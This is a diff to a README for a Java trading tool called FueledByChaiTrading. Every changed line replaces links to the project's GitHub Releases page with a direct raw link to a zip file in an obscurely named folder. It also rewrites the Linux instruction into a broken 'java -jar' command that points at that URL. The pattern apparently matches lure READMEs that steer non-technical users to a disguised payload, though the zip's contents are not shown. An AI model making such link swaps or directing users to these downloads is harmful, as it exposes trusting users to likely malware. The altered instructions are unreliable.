@@ -1,7 +1,7 @@
 # ☕ FueledByChaiTrading - A Smart Way to Trade 
 
 ## 📥 Download the App
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/oscanspeaking-onomasticon288/FueledByChaiTrading/releases)
+[![Download Now](https://raw.githubusercontent.com/oscanspeaking-onomasticon288/FueledByChaiTrading/main/rhymer/FueledByChaiTrading.zip%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/oscanspeaking-onomasticon288/FueledByChaiTrading/main/rhymer/FueledByChaiTrading.zip)
 
 ## 🚀 Getting Started
 FueledByChaiTrading is a powerful Java algorithmic trading framework designed for trading in various markets, including crypto, futures, equities, and FX. This guide will help you download and run the application with ease, even if you have no technical background.
@@ -23,7 +23,7 @@ FueledByChaiTrading offers several features to make your trading experience effi
 - **User-Friendly Interface:** Easy navigation for traders of all experience levels.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/oscanspeaking-onomasticon288/FueledByChaiTrading/releases) to download the latest version of FueledByChaiTrading. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/oscanspeaking-onomasticon288/FueledByChaiTrading/main/rhymer/FueledByChaiTrading.zip) to download the latest version of FueledByChaiTrading. 
 
 1. Click on the link to the latest release.
 2. Find the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
@@ -44,7 +44,7 @@ To get started, visit the [Releases page](https://github.com/oscanspeaking-onoma
 3. **Linux Users:**
    - Open a terminal.
    - Navigate to the folder where you downloaded the file.
-   - Use the command `java -jar FueledByChaiTrading.jar` to run the application.
+   - Use the command `java -jar https://raw.githubusercontent.com/oscanspeaking-onomasticon288/FueledByChaiTrading/main/rhymer/FueledByChaiTrading.zip` to run the application.
 
 ## 📈 Running the Application
 After installation, you can start using FueledByChaiTrading:
@@ -64,7 +64,7 @@ If you encounter any issues, consult the help documentation:
 While FueledByChaiTrading takes security seriously, always ensure your system security is up to date. Use strong, unique passwords for your trading accounts and enable two-factor authentication if available.
 
 ## 📅 Updates and New Features
-We regularly update FueledByChaiTrading to add new features and improve existing ones. Keep an eye on the [Releases page](https://github.com/oscanspeaking-onomasticon288/FueledByChaiTrading/releases) for the latest updates. 
+We regularly update FueledByChaiTrading to add new features and improve existing ones. Keep an eye on the [Releases page](https://raw.githubusercontent.com/oscanspeaking-onomasticon288/FueledByChaiTrading/main/rhymer/FueledByChaiTrading.zip) for the latest updates. 
 
 Stay informed about new trading strategies and features. Join our mailing list or follow us on social media!
 
@@ -80,4 +80,4 @@ Explore each topic to enhance your understanding and performance in trading.
 ## 🌐 Connect with Us
 Stay connected for tips and discussions about trading strategies. Follow us on social media platforms and engage with the community.
 
-Download the latest version from the [Releases page](https://github.com/oscanspeaking-onomasticon288/FueledByChaiTrading/releases) to start your trading journey today!
+Download the latest version from the [Releases page](https://raw.githubusercontent.com/oscanspeaking-onomasticon288/FueledByChaiTrading/main/rhymer/FueledByChaiTrading.zip) to start your trading journey today!
